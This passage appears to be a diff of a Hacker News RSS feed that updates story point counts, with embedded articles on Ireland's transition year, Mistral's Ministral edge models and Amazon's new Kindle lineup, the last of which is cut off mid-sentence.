             <link>https://github.com/usefulsensors/qc_npu_benchmark</link>
             <guid>41863061</guid>
             <pubDate>Wed, 16 Oct 2024 19:44:02 GMT</pubDate>
@@ -1490,7 +2109,7 @@ four times the throughput.</p>
 </article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[We outsmarted CSGO cheaters with IdentityLogger (230 pts)]]></title>
+            <title><![CDATA[We outsmarted CSGO cheaters with IdentityLogger (241 pts)]]></title>
             <link>https://mobeigi.com/blog/gaming/how-we-outsmarted-csgo-cheaters-with-identitylogger/</link>
             <guid>41862028</guid>
             <pubDate>Wed, 16 Oct 2024 18:18:07 GMT</pubDate>
@@ -1498,7 +2117,7 @@ four times the throughput.</p>
 Couldn't get https://mobeigi.com/blog/gaming/how-we-outsmarted-csgo-cheaters-with-identitylogger/: Error: timeout of 10000ms exceeded]]></description>
         </item>
         <item>
-            <title><![CDATA[Ireland's big school secret: how a year off-curriculum changes teenage lives (178 pts)]]></title>
+            <title><![CDATA[Ireland's big school secret: how a year off-curriculum changes teenage lives (179 pts)]]></title>
             <link>https://www.theguardian.com/lifeandstyle/2024/oct/16/ireland-school-secret-transition-year-off-curriculum</link>
             <guid>41861628</guid>
             <pubDate>Wed, 16 Oct 2024 17:36:00 GMT</pubDate>
@@ -1506,7 +2125,7 @@ Couldn't get https://mobeigi.com/blog/gaming/how-we-outsmarted-csgo-cheaters-wit
 <div id="readability-page-1" class="page"><div id="maincontent"><p><span>‘I</span>f you know your Flann O’Brien, you’ll know that bike maintenance and philosophy go arse-on-saddle in this country,” Niall Hare, the 63-year-old headteacher at Kishoge community college in Dublin, told me. He was running through what his students do on their “transition year”, which is the missing fourth year (a year 11 in England, Wales, year 12 in Northern <a href="https://www.theguardian.com/world/ireland" data-link-name="in body link" data-component="auto-linked-tag">Ireland</a> or S4 in Scotland) of the Irish education system. Even the way it’s named has a magical, secret-compartment quality, like Platform 9 3/4 in Harry Potter, or the 7 1/2th floor in Being John Malkovich.</p><p>In Ireland, secondary school starts with the three-year junior cycle, beginning at age 12 or 13, and concluding with a Junior Certificate (roughly equivalent to a GCSE in England, Wales and Northern Ireland or Nationals in Scotland). Then you can either go straight into the two-year senior cycle to start preparing for the Leaving Certificate (roughly equivalent to A-levels or the International Baccalaureate), or you can have a transition year (TY) first – so you could think of it as a kind of gap year, halfway through secondary school.</p><p>There’s no curriculum for any part of TY, but core subjects – Irish, English, maths, PE – have to be covered in some form, for two hours a week. Work experience is recommended at two to four weeks a year; career guidance and social, personal and health education (SPHE) for an hour a week. Otherwise, schools decide for themselves what to do.</p><p>Hare canters through what’s going on in his TY for 2024-25: nine weeks each of Chinese, folklore and law; nine weeks of BodyRight, a consent, relationships and friendship workshop devised by Dublin Rape Crisis Centre. Then there’s everything from aviation to arts, coding to car maintenance, political engagement to boxing. There’s a young scientist programme, with two separate blocks of work experience. As part of a Stem module, two former police officers set up a crime scene and show kids how to run an investigation.</p><p>Even though you’re not graded, you do have to participate: Paul Mescal recalled being dragged into musicals on his TY at his Maynooth post-primary. He ended up being cast as the lead in their production of Phantom of the Opera. “I know for a fact I probably wouldn’t have auditioned because of the masculinity that I’d been prescribed by being on a sports team,” he later said. “But since we all <em>had</em> to audition, I was, like, ‘Well, I may as well put my best foot forward.’”</p><p>Cillian Murphy also became an actor during his TY, via a theatre workshop that not only fostered a passion for the stage but introduced him to the artistic director Pat Kiernan, who later cast him in his breakthrough production, Disco Pigs. “I remember loving it,” Murphy <a href="https://www.thesun.ie/tvandshowbiz/5020549/cillian-murphy-raising-kids-peaky-blinders/" data-link-name="in body link">later said</a>. “It felt like a real oasis between the junior cycle and the senior cycle.”</p><figure id="c93c3584-9e57-4a0a-a88a-a48bd4a5414d" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.ImageBlockElement"><div id="img-2"><picture><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=620&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 660px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 660px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 660px)"><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=605&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 480px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 480px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=605&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 480px)"><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=445&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 320px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 320px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 320px)"><img alt="A teacher and three students during a school’s anti-racism week" src="https://i.guim.co.uk/img/media/6800b05b8b0c2666a16dcc166ec09283d877a913/108_412_6005_3603/master/6005.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" width="445" height="267" loading="lazy"></picture></div><figcaption data-spacefinder-role="inline"><span><svg width="18" height="13" viewBox="0 0 18 13"><path d="M18 3.5v8l-1.5 1.5h-15l-1.5-1.5v-8l1.5-1.5h3.5l2-2h4l2 2h3.5l1.5 1.5zm-9 7.5c1.9 0 3.5-1.6 3.5-3.5s-1.6-3.5-3.5-3.5-3.5 1.6-3.5 3.5 1.6 3.5 3.5 3.5z"></path></svg></span><span>A teacher and students during anti-racism week.</span> Photograph: Bríd O’Donovan/The Guardian</figcaption></figure><p>It’s not always the razzle-dazzle stuff that students talk about. Kacey, who is 17 and in her final senior year at Kishoge, is studying for her driving theory test. “I’m terrified of the road,” she says. “If I hop in a car, I’m crashing into a wall. But in the modules, seeing that it’s not so easy for everyone else – it’s a slow work-up, knowing how stuff works.” Stuff like: what do you put on a CV? How do you acclimatise your parents to the new reality that you’re a young adult? How do you use a bus timetable? How do you address a citizens’ assembly on the subject of drug abuse? How do you make a burrito? “TY says, ‘OK, you need to know this soon. Sit down, we’re going to teach it to you, we’re not just going to expect you to guess.’”</p><p>Transition year is either 50 years old this year, or 30, depending on whether you date it from the first pilot schools in 1974, or the national rollout in 1994. Now, 99% of schools offer TY programmes, and almost 80% of students choose it.</p><p>It was the brainchild of Richard Burke, a passionate internationalist who joined the Fine Gael party to deepen Ireland’s relationship with <a href="https://www.theguardian.com/world/europe-news" data-link-name="in body link" data-component="auto-linked-tag">Europe</a>, but arguably made his greatest impact with his maverick views on education and child development. “The original idea was to create a space for kids where they could take a year out, and appreciate some of the finer arts – classical music, great literature, that sort of thing,” says Burke’s son David, a barrister. Burke, who died in 2016, had grown up in rural Tipperary in a large, extremely poor family, fatherless as a result of the second world war. What he really wanted to close was the cultural gap between rich and poor – the fact that, as seriously as education has always been taken in Ireland, it had a grindstone quality, every moment maximised for some measurable self-improvement. Gerry Jeffers, a semi-retired researcher and lecturer who was a driving force in rolling out TY in the 90s, said the idea was to “take a break from the treadmill. A bit of the spirit of that lovely poem: ‘What is this life if, full of care, we have no time to stand and stare?’”</p><p>It started in three schools, in Dublin, Limerick and County Galway, and it was a little wild, to be honest. Sheelagh Hare, Niall’s sister who now lives in Australia, did her school’s pilot TY in 1978 and, she says, “We didn’t do anything like they do now. There was none of that zip-lining.” Instead, they did six UK O-levels, when they’d just come out of Junior Certification, so ended up with a bunch of random sort-of duplicated qualifications. “The teachers didn’t really know what to do with us. But I was quite young in my mindset, so I got a lot out of just having an extra year.”</p><p>That, emphatically, would not have been what Burke had in mind. And there would be elements of even the best of a modern transition year which he wouldn’t be thrilled about either, David says: “I think he’d be a little bit disappointed, although not terribly, by the fact that kids are using part of the year for work experience.” If the TY was initially conceived as a pause in the commodification of the human experience, the way it has evolved reveals a lot about our changing expectations of the market, what we’ve surrendered to it and what we still hope to preserve.</p><figure id="23ea7e47-80ff-42f6-ad21-feccc8df5445" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.ImageBlockElement"><div id="img-3"><picture><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=620&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 660px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 660px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 660px)"><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=605&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 480px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 480px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=605&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 480px)"><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=445&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 320px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 320px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 320px)"><img alt="An overhead shot of students at Kishoge community college" src="https://i.guim.co.uk/img/media/6df07b02e80cf6e95a440dac92583b92a78acefb/0_339_6480_3888/master/6480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" width="445" height="267" loading="lazy"></picture></div><figcaption data-spacefinder-role="inline"><span><svg width="18" height="13" viewBox="0 0 18 13"><path d="M18 3.5v8l-1.5 1.5h-15l-1.5-1.5v-8l1.5-1.5h3.5l2-2h4l2 2h3.5l1.5 1.5zm-9 7.5c1.9 0 3.5-1.6 3.5-3.5s-1.6-3.5-3.5-3.5-3.5 1.6-3.5 3.5 1.6 3.5 3.5 3.5z"></path></svg></span><span>Kishoge community college.</span> Photograph: Bríd O’Donovan/The Guardian</figcaption></figure><p>The pilot scheme was enough of a success that the government put some money behind it in the 1990s – approximately £50 a student, Jeffers remembers – and it was expanded to almost every school, to considerable resistance from educators, who thought parents wouldn’t have it, which initially they didn’t. “Regularly on radio phone-ins in the 90s, people would say, ‘It’s a waste of time,’” says Jeffers. “My attitude was: let people have their say. If this thing is working, parents are soon going to phone in with the other side of the story. When they experienced it, they saw it as fantastic – they could see their youngsters growing and developing and maturing and gaining confidence.”</p><p>What comes up now on those phone-ins is still that it’s a “doss year”, plus objections to the fact that kids can be 19 before they finish school, so – in the memorable image of <a href="https://www.tiktok.com/@newstalkfm/video/7403284261609983265" data-link-name="in body link">one radio DJ</a> – “you see fellas with full beards now in sixth year”. “Every transition year is different,” Niall tells me, walking through the high-ceilinged corridors of his school, which opened in 2014. It’s anti-racism week, and downstairs, mid-morning, people are fixing up a pot luck lunch. Students have brought in the cuisine of their forebears. The place smells delicious. Hare says “it’s a myth that it’s a doss year”, in his experience, and “the second myth is that the kids lose the habit of study”.</p><p>After TY comes two years of the senior cycle culminating in the Leaving Cert, scored out of a maximum of 625 and highly deterministic of what university and course you can apply for (another way to string out your school career until you have a full beard is to retake that for a higher score). An <a href="https://www.esri.ie/publications/the-transition-year-programme-an-assessment" data-link-name="in body link">ESRI study</a>, albeit 20 years old, found that students who did a transition year got an average of 40 more points that those who went straight into the senior cycle, while repeating students only got an average of five more points.</p><p>The data is complicated by the fact that TY is meant to be an escape from “all the pressure on points, points, points”, Jeffers says, exasperated. “Transfer rates to tertiary institutions. What’s a good school? Is it how many of those people went off to Trinity, or did the students discover something about themselves?” (If we want to get “points, points, points” about it, though, Ireland performs far <a href="https://www.oecd.org/en/publications/pisa-2022-results-volume-i-and-ii-country-notes_ed6fbcc5-en/ireland_01173012-en.html" data-link-name="in body link">above the OECD average</a> in maths and science, and in literacy, it is second only to Singapore.)</p><p>Those discoveries students make about themselves are completely idiosyncratic. Scott, 17, went in to TY thinking he wanted to be a coder and came out wanting to study psychology. Jess, 17, says “before TY I was really nose-in-books, always English/theoretical based. I did the coding module, and as a result of that, I’ve ended up doing computer science.” Niamh, 18, discovered hiking is not as bad as it looks. Sive, 18, did a module on drug abuse and has since addressed a citizens’ assembly, and has spoken to the Irish finance minister “to increase the drug prevention budget and try to increase the personal budget”. Oh, also, “I’m changing a tyre, I’m cooking. There was one teacher, I didn’t peep a word in his class. After TY, now I’m in fifth year, I’ll sit in his room and eat my lunch.”</p><figure id="75681756-3111-484d-b754-5c5cd0cdca33" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.ImageBlockElement"><div id="img-4"><picture><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=620&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 660px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 660px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 660px)"><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=605&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 480px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 480px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=605&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 480px)"><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=445&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 320px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 320px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 320px)"><img alt="Learning cycling skills" src="https://i.guim.co.uk/img/media/cc9367750db22eb29a433d782b2af88125a79c43/0_0_6480_3888/master/6480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" width="445" height="267" loading="lazy"></picture></div><figcaption data-spacefinder-role="inline"><span><svg width="18" height="13" viewBox="0 0 18 13"><path d="M18 3.5v8l-1.5 1.5h-15l-1.5-1.5v-8l1.5-1.5h3.5l2-2h4l2 2h3.5l1.5 1.5zm-9 7.5c1.9 0 3.5-1.6 3.5-3.5s-1.6-3.5-3.5-3.5-3.5 1.6-3.5 3.5 1.6 3.5 3.5 3.5z"></path></svg></span><span>Learning cycling skills.</span> Photograph: Bríd O’Donovan/The Guardian</figcaption></figure><p>That is echoed in the teachers’ experience: they say TY deepens their relationships with students, and, freed from a curriculum, they can explore their own passions. Dale McCarthy, 37, says he emigrated to Ireland from England, having taught in Manchester and two large London comprehensives. “When I was in the UK, the class’s grades were mine. Now, they don’t feel like my results. They belong to an individual. I was blown away by that: ‘Oh right, the students are in charge of their own learning.’ As teachers, we’re trusted. The levels of bureaucracy are much lower. No one’s checking to see if I taught my lessons. If I was in the room, I taught it.” In London, he was burnt out and doubted he’d be teaching till he was 50; now, he says, he’s probably a lifer. Teaching has a much higher status in Ireland, and transition year both recognises and contributes to that.</p><p>Against all that positivity, though, transition year doesn’t happen in a bell jar. Kishoge is one of 118 “<a href="https://www.educatetogether.ie/" data-link-name="in body link">Educate Together</a>” schools in Ireland – part of a drive to break the stranglehold the Catholic church has had over education. Its founding values are that it’s democratically run, equality-based, learner-centred and co-educational, and it has special educational needs provision where kids with disabilities can dip in and out of mainstream education, including TY. “It’s not that complicated, to go between sensory needs support and horticulture,” Eve Brennan, the SEN coordinator, says.</p><p>Kishoge isn’t, in other words, necessarily representative of the wider social experience. <a href="https://www.oco.ie/app/uploads/2024/09/OCO-In-Focus-Fair-Access-to-Transition-Year-2.pdf" data-link-name="in body link">A report</a> this year by Ireland’s ombudsman for children registered “complaints about equitable access” and “inconsistencies in admission” to TY in schools around the country. Kids could be excluded for behavioural incidents that they had no idea would have major repercussions, for example (in one memorable case study, a boy was refused a place because he’d been bullied in third year).</p><p>Then there is the financial aspect of TY: some parents just can’t afford it. Although the government covers the baseline costs of the teachers, plus offering extra funding per student and grants that are means-tested, the cost to parents can be prohibitive, at anywhere between €100 and €900. The ombudsman has castigated this, saying all children have a right to participate, and calling for “a specific child’s rights framework with guiding principles on how schools should administer admission to this highly desirable and beneficial year in school”.</p><p>Mid-afternoon outside Kishoge, Michael Manners is showing the transition year class how to mend a bike puncture and cycle a roundabout. Their skills vary wildly, and make me think back to the first time I cycled a roundabout, which was a total guess. (I didn’t even know you gave way to the right; I thought the rule was “whoever’s the bravest”.) As much as the principle that all kids have a right to participate might shine an unflattering light on contextual inequalities, the scheme is still a good one. It’s great to find your calling during Phantom of the Opera. It’s also great if you know how to cycle a roundabout.</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Optimizing the Ion compiler back end (120 pts)]]></title>
+            <title><![CDATA[Optimizing the Ion compiler back end (124 pts)]]></title>
             <link>https://spidermonkey.dev/blog/2024/10/16/75x-faster-optimizing-the-ion-compiler-backend.html</link>
             <guid>41861442</guid>
             <pubDate>Wed, 16 Oct 2024 17:15:24 GMT</pubDate>
@@ -1602,7 +2221,7 @@ Couldn't get https://mobeigi.com/blog/gaming/how-we-outsmarted-csgo-cheaters-wit
       </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Winamp deletes entire GitHub source code repo after a rocky few weeks (374 pts)]]></title>
+            <title><![CDATA[Winamp deletes entire GitHub source code repo after a rocky few weeks (377 pts)]]></title>
             <link>https://arstechnica.com/gadgets/2024/10/winamp-really-whips-open-source-coders-into-frenzy-with-its-source-release/</link>
             <guid>41861056</guid>
             <pubDate>Wed, 16 Oct 2024 16:34:15 GMT</pubDate>
@@ -1628,7 +2247,7 @@ Couldn't get https://mobeigi.com/blog/gaming/how-we-outsmarted-csgo-cheaters-wit
                   </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[ArchiveBox is evolving: the future of self-hosted internet archives (528 pts)]]></title>
+            <title><![CDATA[ArchiveBox is evolving: the future of self-hosted internet archives (536 pts)]]></title>
             <link>https://docs.sweeting.me/s/archivebox-plugin-ecosystem-announcement</link>
             <guid>41860909</guid>
             <pubDate>Wed, 16 Oct 2024 16:18:39 GMT</pubDate>
@@ -1810,7 +2429,7 @@ docker pull archivebox/archivebox:dev
 </div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Show HN: A fair Product Hunt alternative (110 pts)]]></title>
+            <title><![CDATA[Show HN: A fair Product Hunt alternative (114 pts)]]></title>
             <link>https://simplelister.com/</link>
             <guid>41860810</guid>
             <pubDate>Wed, 16 Oct 2024 16:11:49 GMT</pubDate>
@@ -1880,7 +2499,7 @@ docker pull archivebox/archivebox:dev
             </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Efficient high-resolution image synthesis with linear diffusion transformer (174 pts)]]></title>
+            <title><![CDATA[Efficient high-resolution image synthesis with linear diffusion transformer (178 pts)]]></title>
             <link>https://nvlabs.github.io/Sana/</link>
             <guid>41859805</guid>
             <pubDate>Wed, 16 Oct 2024 14:56:22 GMT</pubDate>
@@ -2053,7 +2672,7 @@ docker pull archivebox/archivebox:dev
 </div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Un Ministral, Des Ministraux (196 pts)]]></title>
+            <title><![CDATA[Un Ministral, Des Ministraux (199 pts)]]></title>
             <link>https://mistral.ai/news/ministraux/</link>
             <guid>41859466</guid>
             <pubDate>Wed, 16 Oct 2024 14:31:18 GMT</pubDate>
@@ -2061,7 +2680,7 @@ docker pull archivebox/archivebox:dev
 <div id="readability-page-1" class="page"><div><h2 id="introducing-the-worlds-best-edge-models">Introducing the world’s best edge models</h2><p>On the first anniversary of the release of Mistral 7B, the model that revolutionized independent frontier AI innovation for millions, we are proud to introduce two new state-of-the-art models for on-device computing and at-the-edge use cases. We call them les Ministraux: Ministral 3B and Ministral 8B.</p><p>These models set a new frontier in knowledge, commonsense, reasoning, function-calling, and efficiency in the sub-10B category, and can be used or tuned to a variety of uses, from orchestrating agentic workflows to creating specialist task workers. Both models support up to 128k context length (currently 32k on vLLM) and Ministral 8B has a special interleaved sliding-window attention pattern for faster and memory-efficient inference.</p><h3 id="use-cases">Use cases</h3><p>Our most innovative customers and partners have increasingly been asking for local, privacy-first inference for critical applications such as on-device translation, internet-less smart assistants, local analytics, and autonomous robotics. Les Ministraux were built to provide a compute-efficient and low-latency solution for these scenarios. From independent hobbyists to global manufacturing teams, les Ministraux deliver for a wide variety of use cases.</p><p>Used in conjunction with larger language models such as Mistral Large, les Ministraux are also efficient intermediaries for function-calling in multi-step agentic workflows. They can be tuned to handle input parsing, task routing, and calling APIs based on user intent across multiple contexts at extremely low latency and cost.</p><h3 id="benchmarks">Benchmarks</h3><p>We demonstrate the performance of les Ministraux across multiple tasks where they consistently outperform their peers. We re-evaluated all models with our internal framework for fair comparison.</p><h4 id="pretrained-models">Pretrained Models</h4><p><img src="https://mistral.ai/images/news/ministraux/pretrain_table.png" alt="Pretrained model comparison table" width="80%"></p><p><b>Table 1:</b> Ministral 3B and 8B models compared to Gemma 2 2B, Llama 3.2 3B, Llama 3.1 8B and Mistral 7B on multiple categories</p><p><img src="https://mistral.ai/images/news/ministraux/pretrain_with_gemma.png" alt="Pretrained model comparison graph" width="80%"></p><p><b>Figure 1:</b> Ministral 3B and 8B base models compared to Gemma 2 2B, Llama 3.2 3B, Llama 3.1 8B and Mistral 7B</p><h4 id="instruct-models">Instruct Models</h4><p><img src="https://mistral.ai/images/news/ministraux/instruct_table_with_gemma.png" alt="Instruct model comparison table" width="80%"></p><p><b>Table 2:</b> Ministral 3B and 8B Instruct models compared to Gemma 2 2B, Llama 3.2 3B, Llama 3.1 8B, Gemma 2 9B and Mistral 7B on different evaluation categories.</p><p><img src="https://mistral.ai/images/news/ministraux/instruct_plot_3b_no_qwen_with_mistral_logo.png" alt="3B Instruct model comparison graph" width="80%"></p><p><b>Figure 2:</b> A comparison of the 3B family of Instruct models - Gemma 2 2B, Llama 3.2 3B and Ministral 3B. The figure showcases the improvements of Ministral 3B over the much larger Mistral 7B.</p><p><img src="https://mistral.ai/images/news/ministraux/instruct_plot_8b_with_mistral_logo.png" alt="8B Instruct model comparison graph" width="80%"></p><p><b>Figure 3:</b> A comparison of the 8B family of Instruct models - Gemma 2 9B, Llama 3.1 8B, Mistral 7B and Ministral 8B.</p><h3 id="availability-and-pricing">Availability and pricing</h3><p>Both models are available starting today.</p><table><thead><tr><th>Model</th><th>API</th><th>Pricing on la Plateforme</th><th>License</th></tr></thead><tbody><tr><td>Ministral 8B</td><td>ministral-8b-latest</td><td>$0.1 / M tokens (input and output)</td><td>Mistral Commercial License<br>Mistral Research License</td></tr><tr><td>Ministral 3B</td><td>ministral-3b-latest</td><td>$0.04 / M tokens (input and output)</td><td>Mistral Commercial License</td></tr></tbody></table><p>For self-deployed use, <a href="https://mistral.ai/contact/">please reach out to us</a> for commercial licenses. We will also assist you in lossless quantization of the models for your specific use-cases to derive maximum performance.</p><p>The model weights for <a href="https://huggingface.co/mistralai/Ministral-8B-Instruct-2410">Ministral 8B Instruct</a> are available for research use. Both models will be available from our <a href="https://docs.mistral.ai/deployment/cloud/overview/">cloud partners</a> shortly.</p><h3 id="more-to-come">More to come</h3><p>At Mistral AI, we continue pushing the state-of-the-art for frontier models. It’s been only a year since the release of Mistral 7B, and yet our smallest model today (Ministral 3B) already outperforms it on most benchmarks. We can’t wait for you to try out les Ministraux and give us feedback.</p><p><img src="https://mistral.ai/images/news/ministraux/meme_cropped.png" alt="More to come" width="50%"></p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Amazon reveals first color Kindle, new Kindle Scribe, and more (307 pts)]]></title>
+            <title><![CDATA[Amazon reveals first color Kindle, new Kindle Scribe, and more (321 pts)]]></title>
             <link>https://www.aboutamazon.com/news/devices/new-kindle-color-scribe-paperwhite-entry</link>
             <guid>41859047</guid>
             <pubDate>Wed, 16 Oct 2024 13:52:55 GMT</pubDate>
@@ -2069,7 +2688,7 @@ docker pull archivebox/archivebox:dev
 <div id="readability-page-1" class="page"><p>Our e-reader lineup also features a reimagined Kindle Scribe and the fastest Kindle Paperwhite ever.</p><div><article><div><p><span><p><span>There’s never been a better time to pick up a Kindle. Amazon is introducing </span><a target="_blank" href="https://www.amazon.com/kindlefamily"><span>an entirely new lineup of Kindle devices</span></a><span>, including the first-ever color Kindle, a reimagined Kindle Scribe, the fastest Kindle Paperwhite ever, and a new entry Kindle in a fun, new Matcha color.</span></p></span></p></div><div><p><span><p><span>Let’s get to know the newest Kindle devices.</span><br></p></span></p></div><div><p><h2>Introducing Kindle Colorsoft Signature Edition</h2></p></div><div><p><img alt="Amazon Kindle Colorsoft displaying book cover and highlighted text" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/f002870/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2Fae%2Fcb%2F768e417f48e3975ce7f13a6dfe2a%2Faa-oct24-kindlecolorsoft-standard-inline-v1-400kb-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>The all-new </span><a target="_blank" href="https://www.amazon.com/kindlecolorsoft"><span>Kindle Colorsoft</span></a><span> brings color to Kindle without compromise. It has everything customers love about Kindle today—high contrast, fast page turns, an auto-adjusting front light, and weeks of battery life. It adds color that is vibrant yet easy on the eyes. Now, you can browse covers in color in your Kindle Library or Store; see book photos and images in color; or add color highlights that you can easily search later.</span></p></span></p></div><div data-testid="RelatedContent"><p><a href="https://www.aboutamazon.com/news/devices/kindle-color-specs-price-announce"><img alt="Color Kindle with highlighted text in front of an airplane window" height="200" role="" src="https://assets.aboutamazon.com/dims4/default/feef579/2147483647/strip/true/crop/1350x900+130+0/resize/300x200!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F42%2F80%2Fdcfbccc2454982c78f022b82fdd7%2Faa-oct2024-kindle-seabreeze-standard-inline-v4-1600x900.jpg" width="300"></a></p></div><div><p><span><p><span>Everything about Kindle Colorsoft was meticulously designed to deliver rich, paper-like color. It uses an oxide backplane with custom waveforms for fast performance and a higher contrast on both color and black-and-white content. Its custom Colorsoft display includes a new light-guide with nitride LEDs that, when combined with our custom algorithms, enhances color and increases brightness, all without washing out details. You can zoom in on images without worrying about pixelation, and you can choose between standard or vibrant color styles. Kindle Colorsoft comes with wireless charging, up to eight weeks of battery life, and is waterproof so you can bring it with you in the bath or take it to the beach without having to worry.</span><br></p></span></p></div><div><p><h2>The new Kindle Scribe, with in-book writing and an AI-powered notebook</h2></p></div><div><p><img alt="Notes written on Kindle Scribe" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/8802301/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2Fc7%2F3f%2F05ac92204002b0f11c46f8e5c183%2Faa-oct24-kindlescribe-standard-inline-v2-400kb-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>The all-new </span><a target="_blank" href="https://www.amazon.com/dp/B0CZ9VFQ2P?th=1"><span>Kindle Scribe</span></a><span> combines all the benefits of Kindle with a powerful notetaking device. The display has new white borders, and the screen has a smooth, paper-like texture that makes it look and feel like you’re writing on a sheet of paper. Plus, at 300 ppi, text looks crisp and clear when you’re writing or reading. The Premium Pen is finely crafted to deliver just the right heft and balance, so it feels like holding an actual pen, and the new soft-tipped eraser feels like a pencil—you’ll think you have to brush the screen clean after erasing.</span></p></span></p></div><div data-testid="RelatedContent"><p><a href="https://www.aboutamazon.com/news/devices/fun-kindle-features"><img alt="Prime Student" height="200" role="" src="https://assets.aboutamazon.com/dims4/default/fa0dffb/2147483647/strip/true/crop/1350x900+125+0/resize/300x200!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F93%2F98%2F6b4f877441aa99dcd13974f5629e%2Fheres-everything-you-get-with-prime-student-beyond-the-regular-prime-membership-inline-v2-kindle-unlimited.jpg" width="300"></a></p></div><div><p><span><p><span>The new Kindle Scribe offers a first-of-its-kind in-book writing experience and a more powerful notetaking experience. With Active Canvas, you can write your thoughts directly in the book when inspiration strikes. Your note becomes part of the page, and the book text dynamically flows around it—if you increase the font size, change the font style, or the book layout changes, the note remains visible exactly where you want it so you never lose any meaning or context. Coming soon, you’ll also be able to write your notes in the side panel and easily hide them when you are done. The 